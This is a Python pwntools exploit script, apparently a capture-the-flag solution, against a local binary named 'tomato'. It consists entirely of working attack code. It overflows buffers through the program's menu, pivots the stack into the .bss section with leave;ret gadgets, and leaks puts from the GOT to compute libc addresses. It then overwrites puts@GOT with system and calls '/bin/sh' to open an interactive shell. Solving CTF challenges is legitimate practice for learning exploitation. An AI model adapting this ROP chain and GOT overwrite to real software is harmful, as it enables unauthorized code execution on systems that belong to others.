from pwn import*

p = process('./tomato')

bss = 0x602080 + 0x400 #0x602480
read_leave_ret = 0x400d1a
read_leave_ret20 = 0x400d4c
leave_ret = 0x400c25

puts_got = 0x602020
puts_plt = 0x4006a0
printf_got = 0x602028 #more info for libc
read_plt = 0x4006d0

pop_rsi_ret = 0x400d84
pop_rdi_ret = 0x400fa3
pop_rdx_ret = 0x400d7e

time = 0.1

def buy(comment, numoftomato):
	p.recvuntil('> ')
	p.sendline('1'); sleep(time)
	p.recvuntil('> ')
	p.sendline(numoftomato); sleep(time)
	p.recvuntil('You : ')
	p.send(comment); sleep(time)

def newmenu(explain):
	p.recvuntil('> ')
	p.sendline('4'); sleep(time)
	p.recvuntil('explain : ')
	p.send(explain); sleep(time)
	p.recvuntil('GET OUT!\n');

payload = b''
payload += b'a'*0x14
payload += b'b'*0x4
payload += p32(2) #we need int(2) of 4bytes
print(payload)
buy(payload, '1')

payload = b''
payload += b'a'*0x20
payload += p64(bss+0x50)
payload += p64(read_leave_ret20)
newmenu(payload)

payload = b''
payload += p64(bss+0x300)
payload += p64(pop_rsi_ret)
payload += p64(bss+0x200)
payload += p64(read_leave_ret)
payload += p64(bss+0x30) #change... 30 -> 0x30
payload += p64(leave_ret)
p.send(payload); sleep(time)

p.recvuntil('GET OUT!\n');

payload = b''
payload += b'b'*0x8
payload += p64(pop_rdi_ret)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(pop_rsi_ret)
payload += p64(puts_got)
payload += p64(pop_rdi_ret)
payload += p64(0)
payload += p64(read_plt)
payload += p64(pop_rdi_ret)
payload += p64(puts_got+0x8)
payload += p64(puts_plt)
payload += b'a'*(0x100-len(payload))
payload += p64(bss+0x200)
payload += p64(leave_ret)
p.send(payload); sleep(time)

libc_puts = u64(p.recv(0x6).ljust(0x8, b'\x00'));
print('libc_func:', hex(libc_puts))
libc_base = libc_puts - 0x06f6a0
libc_system = libc_base + 0x0453a0

p.sendline(p64(libc_system)+b'/bin/sh\x00')

p.interactive()